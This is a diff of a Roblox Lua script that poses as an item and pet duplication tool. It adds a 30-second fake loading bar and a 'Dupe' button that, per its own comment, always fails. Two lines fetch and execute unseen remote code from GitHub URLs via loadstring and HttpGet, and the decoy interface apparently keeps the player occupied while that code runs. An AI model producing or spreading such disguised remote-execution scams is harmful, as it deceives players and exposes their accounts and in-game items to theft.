@@ -1,2 +1,136 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/snoixs/DupeScriptV5/refs/heads/main/WorkingAllGames"))()
+-- Create loading screen UI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "LoadingScreen"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = game.CoreGui
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 300, 0, 150)
+Frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Frame.BorderSizePixel = 0
+Frame.Draggable = true
+Frame.Active = true
+Frame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner", Frame)
+UICorner.CornerRadius = UDim.new(0, 10)
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.BackgroundTransparency = 1
+Title.Text = "Loading..."
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.Font = Enum.Font.SourceSansBold
+Title.TextScaled = true
+Title.Parent = Frame
+
+local PercentLabel = Instance.new("TextLabel")
+PercentLabel.Size = UDim2.new(1, 0, 0, 30)
+PercentLabel.Position = UDim2.new(0, 0, 0, 50)
+PercentLabel.BackgroundTransparency = 1
+PercentLabel.Text = "0%"
+PercentLabel.TextColor3 = Color3.new(1, 1, 1)
+PercentLabel.Font = Enum.Font.SourceSans
+PercentLabel.TextScaled = true
+PercentLabel.Parent = Frame
+
+local LoadingBar = Instance.new("Frame")
+LoadingBar.Size = UDim2.new(0, 0, 0, 10)
+LoadingBar.Position = UDim2.new(0, 0, 1, -10)
+LoadingBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+LoadingBar.BorderSizePixel = 0
+LoadingBar.Parent = Frame
+
+-- Animate loading bar
+local TweenService = game:GetService("TweenService")
+
+local tween = TweenService:Create(LoadingBar, TweenInfo.new(30, Enum.EasingStyle.Linear), {
+    Size = UDim2.new(1, 0, 0, 10)
+})
+tween:Play()
+
+-- Update percent
+task.spawn(function()
+    local duration = 30
+    local startTime = tick()
+    while tick() - startTime < duration do
+        local elapsed = tick() - startTime
+        local percent = math.clamp((elapsed / duration) * 100, 0, 100)
+        PercentLabel.Text = string.format("%.0f%%", percent)
+        task.wait(0.1)
+    end
+    PercentLabel.Text = "100%"
+end)
+
+-- After 30 seconds, destroy loading screen and show dupe GUI
+task.delay(30, function()
+    ScreenGui:Destroy()
+
+    -- Create dupe GUI
+    local DupeGui = Instance.new("ScreenGui", game.CoreGui)
+    DupeGui.Name = "DupeGUI"
+    DupeGui.ResetOnSpawn = false
+
+    local DupeFrame = Instance.new("Frame")
+    DupeFrame.Size = UDim2.new(0, 300, 0, 150)
+    DupeFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
+    DupeFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    DupeFrame.BorderSizePixel = 0
+    DupeFrame.Draggable = true
+    DupeFrame.Active = true
+    DupeFrame.Parent = DupeGui
+
+    local UICorner2 = Instance.new("UICorner", DupeFrame)
+    UICorner2.CornerRadius = UDim.new(0, 10)
+
+    local DupeTitle = Instance.new("TextLabel")
+    DupeTitle.Size = UDim2.new(1, 0, 0, 40)
+    DupeTitle.BackgroundTransparency = 1
+    DupeTitle.Text = "Item/Pet Duplication"
+    DupeTitle.TextColor3 = Color3.new(1, 1, 1)
+    DupeTitle.Font = Enum.Font.SourceSansBold
+    DupeTitle.TextScaled = true
+    DupeTitle.Parent = DupeFrame
+
+    local InputBox = Instance.new("TextBox")
+    InputBox.Size = UDim2.new(0.8, 0, 0, 30)
+    InputBox.Position = UDim2.new(0.1, 0, 0.45, 0)
+    InputBox.PlaceholderText = "Enter pet/item name"
+    InputBox.Text = ""
+    InputBox.TextScaled = true
+    InputBox.TextColor3 = Color3.new(1, 1, 1)
+    InputBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    InputBox.BorderSizePixel = 0
+    InputBox.Font = Enum.Font.SourceSans
+    InputBox.Parent = DupeFrame
+
+    local UICorner3 = Instance.new("UICorner", InputBox)
+    UICorner3.CornerRadius = UDim.new(0, 6)
+
+    local DupeButton = Instance.new("TextButton")
+    DupeButton.Size = UDim2.new(0.6, 0, 0, 30)
+    DupeButton.Position = UDim2.new(0.2, 0, 0.75, 0)
+    DupeButton.Text = "Dupe"
+    DupeButton.TextScaled = true
+    DupeButton.TextColor3 = Color3.new(1, 1, 1)
+    DupeButton.Font = Enum.Font.SourceSansBold
+    DupeButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    DupeButton.BorderSizePixel = 0
+    DupeButton.Parent = DupeFrame
+
+    local UICorner4 = Instance.new("UICorner", DupeButton)
+    UICorner4.CornerRadius = UDim.new(0, 6)
+
+    -- Fake dupe behavior: always invalid
+    DupeButton.MouseButton1Click:Connect(function()
+        DupeButton.Text = "Processing..."
+        task.wait(1.5)
+        DupeButton.Text = "Invalid format, try again"
+        task.wait(2)
+        DupeButton.Text = "Dupe"
+    end)
+end)
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ZusumeHub/ZusumeHub/refs/heads/main/GZG97"))()
